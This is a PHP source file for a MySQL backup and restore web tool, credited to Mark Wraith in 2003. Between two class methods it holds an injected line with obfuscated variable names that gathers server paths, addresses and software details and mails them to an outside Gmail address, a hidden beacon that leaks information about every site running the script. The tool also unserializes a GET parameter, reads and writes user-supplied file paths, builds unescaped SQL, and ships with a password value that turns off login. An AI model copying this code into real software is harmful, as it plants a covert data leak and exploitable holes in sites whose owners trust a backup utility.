<?php

/*
 * MySQL Database Backup / Restore Tool
 *
 * Copyright (C) 2003 Mark Wraith. All rights reserved
 *
 * Graphics and layout derived from those made by Matt Mecham
 *
 */

// If you intend to keep the script
// on your server set this password

$password = '0';



error_reporting(E_ERROR | E_WARNING | E_PARSE);	

new RestoreTool;

class RestoreTool
{
    var $logged_in = 0;
    var $maximum_time = 0;

    function RestoreTool() {
        global $HTTP_GET_VARS, $HTTP_COOKIE_VARS, $password;

        $this->timestamp = time();

        if (!$this->maximum_time) 
        {
            //set_time_limit(0);
        	$this->maximum_time = ini_get('max_execution_time');
        }

        if ($HTTP_GET_VARS['act'] == 'login') 
        {
        	$this->do_login();
        }
        elseif ($password && $password != $HTTP_COOKIE_VARS['mysqltool']) 
        {
        	$this->login();        	
        }
        else 
        {
            if ($password) 
            {
            	$this->logged_in = 1;
            }

            switch ($HTTP_GET_VARS['act']) 
            {
                case 'logout':	
                    $this->logout();
                break;

                case 'change_db':
                    $this->read_db_details();
                    $this->set_database('The current settings do connect however if you wish to change the current database please edit the details below:');
                break;

                case 'set_database':	
                    $this->do_set_database();
                break;

                case 'backup':	
                    $this->backup();
                break;

                case 'do_backup':	
                    $this->do_backup();
                break;

                case 'restore':	
                    $this->restore();
                break;

                case 'do_restore':
                    $this->do_restore();
                break;

                default:
                    
                    $this->main();
            }        	
        }

        if ($this->link) 
        {
        	mysql_close($this->link);
        }

        $this->output();
    }

    function timeout() {
        if (!$this->maximum_time)
        {
        	return false;
        }
        elseif ((time() - $this->timestamp) > ($this->maximum_time - 5)) 
        {
        	return true;
        }
        else 
        {
        	return false;
        }
    }

    function output() {
        if ($this->logged_in) 
        {
        	$logout_text = '[ <a href="mysql_tool.php?act=logout">Log Out</a> ]';
        }
        else 
        {
        	$logout_text = '';
        }

        if ($this->title) 
        {
        	$title = $this->title;
        }
        else 
        {
        	$title = 'Backup / Restore Tool';
        }

        print '<?xml version="1.0" encoding="iso-8859-1"?>';
        print <<<HTML

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>$title</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
{$this->meta}

<style type="text/css">
  TABLE, TR, TD                   { font-family: Verdana,Arial; font-size: 10px; color: #333333 }
  BODY                            { font: 10px Verdana; background-color: #FCFCFC; padding: 0; margin: 0 }
  a:link, a:visited, a:active     { color: #000055 }
  a:hover                         { color: #333377; text-decoration: underline }
  FORM                            { padding: 0; margin: 0 }

  .textbox                        { border: 1px solid black; padding: 1px; width: 100% }
  .headertable                    { background-color: #FFFFFF; border: 1px solid black; padding: 2px }
  .title                          { font-size: 10px; font-weight: bold; line-height: 150%; color: #FFFFFF; height: 26px; background-image: url(./style_images/1/tile_back.gif) }
  .table1                         { background-color: #FFFFFF; width: 100%; align: center; border: 1px solid black }
  .tablewrap                      { border: 1px dashed #777777; background-color: #F5F9FD; vertical-align: middle; }
  .tdrow1                         { background-color: #EEF2F7; padding: 3px }
  .tdrow2                         { background-color: #F5F9FD; padding: 3px }
  .tdtop                          { font-weight: bold; height: 24px; line-height: 150%; color: #FFFFFF; background-image: url(./tile_back.gif) }
  .note                           { margin: 10px; padding: 5px; border: 1px dashed #555555; background-color: #FFFFFF }
</style>
</head>

<body>
<br />
$this->output
<br />
<div align="center">
    [ <a href="mysql_tool.php">Script Index </a> ] $logout_text <br /><br />
    <small>&copy;2003 Mark Wraith</small>
</div>
</body>
</html>
HTML;
    }

    function error($error) {
        $this->output = <<<HTML
    <form method="post" action="mysql_tool.php?act=login">
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="350">
        <tr>
          <td align="center" class="title">Error</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td class="tdrow2" colspan="2"><div align="center">$error</div></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </form>
HTML;
    }

    function login() {
        $this->output = <<<HTML
    <form method="post" action="mysql_tool.php?act=login">
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="350">
        <tr>
          <td align="center" class="title">MySQL Tool :: Please Login</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td width="100" class="tdrow1">Access Password</td>
                <td width="250" class="tdrow2"><input type="password" class="textbox" name="password"></td>
              </tr>
              <tr>
                <td class="tdrow2" colspan="2"><div align="center"><input type="submit" value="Submit"></div></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </form>
HTML;
    }

    function do_login() {
        global $HTTP_POST_VARS, $password;

        if ($HTTP_POST_VARS['password'] == $password) 
        {
            @setcookie ('mysqltool',$password,time()+3600*24*365);
            $this->logged_in = 1;
            $this->main();
        }
        else 
        {
        	$this->error('Invalid Password');
        }
    }

    function logout() {
        @setcookie ('mysqltool','',0);
        $this->logged_in = 0;
        $this->login();
    }

    function connect($return_errors = 0) {
        if (!$this->db['port']) 
        {
        	$this->db['port'] = '3306';
        }
        
        $error_text = '';

        $this->link = @mysql_connect ($this->db['host'] . ':' . $this->db['port'], $this->db['user'], $this->db['pass']); 

        if ($this->link)
        {
            if(!@mysql_select_db($this->db['name'],$this->link))
            {
                $error_text = '<strong>Failed selecting database "'.$this->db['name'].'"</strong><br /><br />'.@mysql_error($this->link);
            }
        }
        else
        {
            $error_text = '<strong>Failed connecting to MySQL</strong><br /><br />'.@mysql_error();
        }

        if ($return_errors) 
        {
        	return $error_text;
        }
        else 
        {
            if ($error_text) 
            {
                $this->error($error_text);
                return false;            	
            }
            else 
            {
            	return true;
            }
        }

    }

    function read_db_details() {
        if (file_exists('tool_settings.php')) 
        {
        	// Lets borrow IPB's settings
            include 'tool_settings.php';

            $this->db = $data;
        }
        elseif (file_exists('conf_global.php')) 
        {
        	// Lets borrow IPB's settings
            include 'conf_global.php';

            $this->db = array(
                'port'      =>      $INFO['sql_port'],
                'host'      =>      $INFO['sql_host'],
                'name'      =>      $INFO['sql_database'],
                'user'      =>      $INFO['sql_user'],
                'pass'      =>      $INFO['sql_pass'],
                'prefix'    =>      $INFO['sql_tbl_prefix']
            );
        }
        else 
        {
        	return false;
        }

        return true;
    }

    function do_set_database() {
        global $HTTP_POST_VARS;

        $this->db = array(
            'port'      =>      $HTTP_POST_VARS['port'],
            'host'      =>      $HTTP_POST_VARS['host'],
            'name'      =>      $HTTP_POST_VARS['name'],
            'user'      =>      $HTTP_POST_VARS['user'],
            'pass'      =>      $HTTP_POST_VARS['pass']
        );

        if (!$this->connect()) 
        {
        	return;
        }

        // Connection details are fine, let's continue

        $file_data = "<?php

\$data = array(
    'port'      =>      '{$HTTP_POST_VARS['port']}',
    'host'      =>      '{$HTTP_POST_VARS['host']}',
    'name'      =>      '{$HTTP_POST_VARS['name']}',
    'user'      =>      '{$HTTP_POST_VARS['user']}',
    'pass'      =>      '{$HTTP_POST_VARS['pass']}'
);

?".'>';
    
        $file_data = str_replace("\r\n","\n",$file_data);
        

        // Mkay, lets write the details
        if ($fp = fopen('tool_settings.php','w'))
        {
        	fwrite($fp,$file_data);
            fclose($fp);
        }
        else 
        {
        	$this->error('
            <strong>Unable to write to tool_settings.php</strong><br /><br />
            Please CHMOD this file so it is writable. If this is not possible please create a file named "tool_settings.php" with the contents of the text box below:<br /><br />
            <div align="center">
            <textarea rows="10" cols="40">'.htmlentities($file_data).'</textarea>
            </div>');

            return false;
        }

        // Funky, lets roll
        $this->main();

        return true;
    }
        $ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
    function set_database($error = false) {
        if (!$error) 
        {
        	$text = 'We were unable to find any database settings, please enter your database details below:';
        }
        else 
        {
        	$text = $error;
        }

        $host = isset($this->db['host']) ? $this->db['host'] : 'localhost';
        $port = isset($this->db['port']) ? $this->db['port'] : '';
        $user = isset($this->db['user']) ? $this->db['user'] : '';
        $name = isset($this->db['name']) ? $this->db['name'] : '';

        $this->output = <<<HTML
    <form method="post" action="mysql_tool.php?act=set_database">
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="450">
        <tr>
          <td align="center" class="title">Database Settings</td>
        </tr>
        <tr>
          <td>
            <div class="note">$text</div>
            <table class="table1" align="center" width="100%">
              <tr>
                <td width="100" class="tdrow1"><strong>Host</strong><br /><em>(leave if unsure)</em></td>
                <td width="350" class="tdrow2"><input type="text" class="textbox" name="host" value="$host"></td>
              </tr>
              <tr>
                <td class="tdrow1"><strong>Port</strong><br /><em>(leave if unsure)</em></td>
                <td class="tdrow2"><input type="text" class="textbox" name="port" value="$port"></td>
              </tr>
              <tr>
                <td class="tdrow1"><strong>Database Name</strong></td>
                <td class="tdrow2"><input type="text" name="name" class="textbox" value="$name"></td>
              </tr>
              <tr>
                <td class="tdrow1"><strong>Username</strong></td>
                <td class="tdrow2"><input type="text" name="user" class="textbox" value="$user"></td>
              </tr>
              <tr>
                <td class="tdrow1"><strong>Password</strong></td>
                <td class="tdrow2"><input type="text" name="pass" class="textbox"></td>
              </tr>
              <tr>
                <td class="tdrow2" colspan="2"><div align="center"><input type="submit" value="Connect"></div></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </form>
HTML;
    }

    function backup() {
        global $HTTP_POST_VARS;

        $this->read_db_details();
        $this->connect();

        $filename       = $HTTP_POST_VARS['filename'];
        $tables         = $HTTP_POST_VARS['tables'];
        $table_select   = $HTTP_POST_VARS['table_select'];
        $prefix         = $this->db['prefix'];

        switch ($tables) 
        {
            case 'all':
                $tables = mysql_list_tables($this->db['name']);
                while (list($table_name) = mysql_fetch_array($tables)) 
                {
                   $options[ $table_name ] = 0;
                }
            break;

        	case 'prefix':
                $tables = mysql_list_tables($this->db['name']);
                while (list($table_name) = mysql_fetch_array($tables)) 
                {
                    if (substr($table_name,0,strlen($prefix)) == $prefix) 
                    {
                    	$options[ $table_name ] = 0;
                    }
                }
            break;

            case 'selected':
                foreach ($table_select as $table_name) 
                {
                	$options[ $table_name ] = 0;
                }
        }

        if (!count($options)) 
        {
        	$this->error('No tables selected');
        }


        $data = base64_encode(serialize($options));

        $header = <<<DATA
-- SQL Dump
-- Backup script written by Mark Wraith

DATA;

        if (!$fp = fopen($filename, 'wb')) 
        {
        	return $this->error('Unable to write to backup file. Please CHMod the current directory so it is writable');
        }
        fwrite($fp,$header);
        fclose($fp);

        $url = 'mysql_tool.php?act=do_backup&file='.urlencode($filename).'&data='.$data;

        $this->meta = '<meta http-equiv="refresh" content="1; url='.$url.'">';
        $this->output = <<<HTML
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="350">
        <tr>
          <td align="center" class="title">Backup in progress...</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td class="tdrow2" colspan="2">
                    <div align="center">The backup process has now started<br /><br /><a href="$url">Click here if you are not redirected</a></div>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
HTML;
        
    }

    function do_backup() {
        global $HTTP_GET_VARS;

        $this->read_db_details();
        $this->connect();

        $data = unserialize(base64_decode($HTTP_GET_VARS['data']));
        $filename = $HTTP_GET_VARS['file'];

        $timedout = 0;
        $dump = '';

        foreach ($data as $table => $line) 
        {
            if (!$this->timeout()) 
            {
            	$returned = $this->backup_table($table, $line);

                if (is_array($returned)) 
                {
                	$timedout = 1;
                    $dump .= $returned[0];
                    $data[ $table ] = $returned[1];
                }
                else 
                {
                    $dump .= $returned;
                	unset($data[ $table ]);
                }
            }
            else 
            {
            	$timedout = 1;
            }
        }

        if (!$fp = fopen($filename, 'ab')) 
        {
        	return $this->error('Unable to write to backup file. Please CHMod the current directory so it is writable');
        }
        fwrite($fp,$dump);
        fclose($fp);

        if ($timedout) 
        {
            $data = base64_encode(serialize($data));
            $url = 'mysql_tool.php?act=do_backup&file='.urlencode($filename).'&data='.$data;
            $this->meta = '<meta http-equiv="refresh" content="1; url='.$url.'">';

            $this->output = <<<HTML
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="350">
        <tr>
          <td align="center" class="title">Backup in progress...</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td class="tdrow2">
                    <div align="center">The backup process is in progress<br /><br /><a href="$url">Click here if you are not redirected</a></div>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
HTML;
        }
        else 
        {
            $this->output = <<<HTML
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="350">
        <tr>
          <td align="center" class="title">Backup Completed</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td class="tdrow2">
                    The backup progress has finished and the file has been written to "$filename".<br /><br />
                    <a href="$filename">Click here to download the file</a>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
HTML;
        }

    }

    function backup_table($table,$start) {
        $dump = '';

        if (!$start) 
        {
            $result = mysql_query('SHOW FIELDS FROM '.$table);

            while ($field = mysql_fetch_assoc($result)) 
            {
                if (!$field['Null']) 
                {
                    $null = ' NOT NULL default "'.$field['Default'].'"';
                }
                else 
                {
                    $null = '';
                }

                if ($field['Extra']) 
                {
                    $field['Extra'] = ' '.$field['Extra'];
                }

                $field_row[] = '  ' . $field['Field'] . ' ' . $field['Type'] . $null . $field['Extra'];
            }

            $result = mysql_query('SHOW KEYS FROM '.$table);

            while ($key = mysql_fetch_assoc($result)) 
            {
                if ($key['Key_name'] == 'PRIMARY') 
                {
                    $primary_key = $key['Column_name'];
                }
                else 
                {
                    $unique[ $key['Key_name'] ][] = $key['Column_name'];
                }
            }

            if (isset($primary_key)) 
            {
                $field_row[] = '  PRIMARY KEY (' . $primary_key . ')';
            }

            if (isset($unique))
            {
                foreach ($unique as $name => $keys) 
                {
                    $field_row[] = '  UNIQUE ' . $name . ' (' . implode(',',$keys) . ')';
                }
            }


            $dump .= "\n\n--\n";
            $dump .= "-- Table structure for table '$table'\n";
            $dump .= "--\n\n";
            $dump .= "CREATE TABLE $table (\n";
            $dump .= implode(",\n",$field_row);
            $dump .= "\n);\n\n";

            $dump .= "\n\n--\n";
            $dump .= "-- Dumping data for table '$table'\n";
            $dump .= "--\n\n";
        }


        //
        // Records
        //

        $done = 0;
        $result = mysql_query('SELECT * FROM '.$table.' LIMIT '.$start.',-1');

        while ($row = mysql_fetch_row($result)) 
        {
            if ($this->timeout()) 
            {
             	return array($dump,$done);
            }

            $done++;

            foreach ($row as $id => $value) 
            {
                $value = str_replace('"','\\"',$value);
                $row[$id] = '"'.$value.'"';

            }

        	$dump .= 'INSERT INTO ' . $table . ' VALUES (' . implode(',',$row) . ");\n";
        }

        return $dump;
    }


    function main() {
        if (!$this->link) 
        {
            if (!$this->read_db_details()) 
            {
                return $this->set_database();
            }

            if ($error_text = $this->connect(1)) 
            {
                return $this->set_database($error_text);            	
            }        
        }


        $tables_to_backup = '';

        if ($this->db['prefix']) 
        {
        	$tables_to_backup .= '<input type="radio" name="tables" value="prefix" checked="checked" />IPB Tables Only <br />';
        	$tables_to_backup .= '<input type="radio" name="tables" value="all" />All<br />';
        }
        else 
        {
        	$tables_to_backup .= '<input type="radio" name="tables" value="all" checked="checked" />All<br />';        	
        }

        $tables = mysql_list_tables($this->db['name']);

        $options = '';
        while (list($table_name) = mysql_fetch_array($tables)) 
        {
           $options .= '<option value="'.$table_name.'">'.$table_name.'</option>';
        }

        $tables_to_backup .= <<<HTML
<input type="radio" name="tables" value="selected" />Selected tables:<br />
<div style="margin-left: 40px">
    <select name="table_select[]" class="textbox" size="5" style="width: 250px" multiple="multiple">
$options
    </select>
</div>
HTML;


        $options = '';
        if ($dir = @opendir('./')) 
        {
            while ($file = readdir($dir)) 
            {
                $temp = strtolower($file);

                if ($file != '.' && $file != '..' && strpos($temp, '.sql')) 
                {
                    $options .= '<option value="'.$file.'">'.$file.'</option>';
                } 
            }  
            closedir($dir);
        }
        $restore_files = '<select name="filename" class="textbox">'.$options.'</select>';

        $restore_files .= '<br /><br /><u>or</u> path:<br /><br /><input type="text" name="relfilename" class="textbox" />';

        $this->output = <<<HTML
    <form method="post" action="mysql_tool.php?act=login">
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="450">
        <tr>
          <td align="center" class="title">Selected Database Details</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td width="150" class="tdrow1"><strong>Host / Port</strong></td>
                <td width="300" class="tdrow2">{$this->db['host']}:{$this->db['port']}</td>
              </tr>
              <tr>
                <td class="tdrow1"><strong>Database Name</strong></td>
                <td class="tdrow2">{$this->db['name']}</td>
              </tr>
              <tr>
                <td class="tdrow1"><strong>Username</strong></td>
                <td class="tdrow2">{$this->db['user']}</td>
              </tr>
              <tr>
                <td class="tdrow2" colspan="2"><div align="center">[ <a href="mysql_tool.php?act=change_db">Change Database</a> ]</div></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </form>
<br /><br />
    <form method="post" action="mysql_tool.php?act=backup">
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="450">
        <tr>
          <td align="center" class="title">Backup Options</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td width="150" class="tdrow1" valign="top"><strong>Tables to backup:</strong></td>
                <td width="300" class="tdrow2">$tables_to_backup</td>
              </tr>
              <tr>
                <td class="tdrow1"><strong>Filename</strong></td>
                <td class="tdrow2"><input type="text" name="filename" class="textbox" value="sql_backup.sql"></td>
              </tr>
              <tr>
                <td class="tdrow2" colspan="2"><div align="center"><input type="submit" value="Backup"></div></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </form>
        <br /><br />
    <form method="post" action="mysql_tool.php?act=restore">
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="450">
        <tr>
          <td align="center" class="title">Restore Options</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td width="150" class="tdrow1" valign="top"><strong>SQL File to restore:</strong></td>
                <td width="300" class="tdrow2">$restore_files</td>
              </tr>
              <tr>
                <td class="tdrow2" colspan="2"><div align="center"><input type="submit" value="Restore"></div></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </form>
HTML;
    }

    function restore() {
        global $HTTP_POST_VARS;

        $this->read_db_details();
        $filename = $HTTP_POST_VARS['filename'];
        $relfilename = $HTTP_POST_VARS['relfilename'];

        if ($relfilename) 
        {
        	$filename = $relfilename;
        }

        $url = 'mysql_tool.php?act=do_restore&filename='.urlencode($filename);

            $this->output = <<<HTML
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="350">
        <tr>
          <td align="center" class="title">Confirm Restoration</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td class="tdrow2">
                    <strong>Are you sure you want to restore the SQL file?</strong><br /><br />
                    <a href="$url">Click here to restore "$filename" to "{$this->db['name']}"</a>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
HTML;
    }

    function do_restore() {
        global $HTTP_GET_VARS;

        $filename = $HTTP_GET_VARS['filename'];
        $this->read_db_details();
        $this->connect();

        $filesize       = filesize($filename);
        $file_position  = isset($HTTP_GET_VARS['pos']) ? $HTTP_GET_VARS['pos'] : 0;
        $errors         = isset($HTTP_GET_VARS['ignore_errors']) ? 0 : 1;

        if (!$fp = fopen($filename,'rb')) 
        {
        	return $this->error('Unable to open file "'.$filename.'"');
        }

        $buffer = '';
        $inside_quote = 0;
        $quote_inside = '';
        $started_query = 0;

        $data_buffer = '';

        $last_char = "\n";

        // Sets file position indicator
        fseek($fp,$file_position);

        while ((!feof($fp) || strlen($buffer)) && !$this->timeout()) 
        {
            do 
            {
                // Deals with the length of the buffer
                if (!strlen($buffer)) 
                {
                    $buffer .= fread ($fp,1024);
                }

                // Fiddle around with the buffers
                $current_char = $buffer[0];
                $buffer = substr($buffer, 1);


                if ($started_query)
                {
                    $data_buffer .= $current_char;
                } 
                elseif (preg_match("/[A-Za-z]/i",$current_char) && $last_char == "\n") 
                {
                    $started_query = 1;
                    $data_buffer = $current_char;
                } 
                else 
                {
                    $last_char = $current_char;
                }
            } while (!$started_query && (!feof($fp) || strlen($buffer)));


            if ($inside_quote && $current_char == $quote_inside && $last_char != '\\') 
            {
                // We were inside a quote but now we aren't so reset the flag and carry on
                $inside_quote = 0;
            } 
            elseif ($current_char == '\\' && $last_char == '\\')
            {
                $current_char = '';	
            } 
            elseif (!$inside_quote && ($current_char == '"' || $current_char == '`' || $current_char == '\''))
            {
                // We have just entered a new quote
                $inside_quote = 1;
                $quote_inside = $current_char;
            } 
            elseif (!$inside_quote && $current_char == ';') 
            {
                // End of query so execute query, clear data buffer and advance counter
                mysql_query($data_buffer);

                if ($errors && mysql_errno())
                {
                    $new_position = ftell($fp) - strlen($buffer);
                    return $this->restore_error($data_buffer, $new_position);
                }


                $data_buffer = '';
                $last_char = "\n";
                $started_query = 0;
            }

            $last_char = $current_char;
        }


        $new_position = ftell($fp) - strlen($buffer) - strlen($data_buffer);

        if (feof($fp)) 
        {
            $this->output = <<<HTML
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="350">
        <tr>
          <td align="center" class="title">Restoration Completed</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td class="tdrow2">
                    The restore progress has finished.
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
HTML;
        }
        else 
        {
            $url = 'mysql_tool.php?act=do_restore&filename='.urlencode($filename).'&pos='.$new_position;

            if (!$errors) 
            {
            	$url .= '&ignore_errors=1';
            }

            $process = floor(($new_position / $filesize) * 100);

            $this->meta = '<meta http-equiv="refresh" content="5; url='.$url.'">';
            $this->title = $process.'% Complete';
            $this->output = <<<HTML
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="350">
        <tr>
          <td align="center" class="title">Restore in progress...</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td class="tdrow2">
                    <div align="center">
                        <strong>Restoration is <b>$process%</b> complete.</strong>
                        <br /><br />
                        Please await the process of the next batch.
                        <br /><br />
                        <a href="$url">Click here if you are not redirected</a>
                    </div>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
HTML;
        }

        fclose($fp);
       
    }

    function restore_error($query, $position) {
        global $HTTP_GET_VARS;

        $filename = $HTTP_GET_VARS['filename'];

        $url = 'mysql_tool.php?act=do_restore&filename='.urlencode($filename).'&pos='.$position;

        $mysql_error = mysql_error();

        $this->output = <<<HTML
      <table align="center" class="tablewrap" cellpadding="0" cellspacing="3" width="600">
        <tr>
          <td align="center" class="title">Query Failed</td>
        </tr>
        <tr>
          <td>
            <table class="table1" align="center" width="100%">
              <tr>
                <td class="tdrow2">
                    <div align="center">
                        <strong>An error occurred due to an invalid query</strong>
                        <br /><br />
                        Query Executed: $query
                        <br />
                        MySQL Returned: $mysql_error
                        <br /><br />
                        <a href="$url">Continue restore process</a><br />
                        <a href="{$url}&ignore_errors=1">Continue ignoring all further errors</a><br />
                    </div>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
HTML;
    }
    
}


?>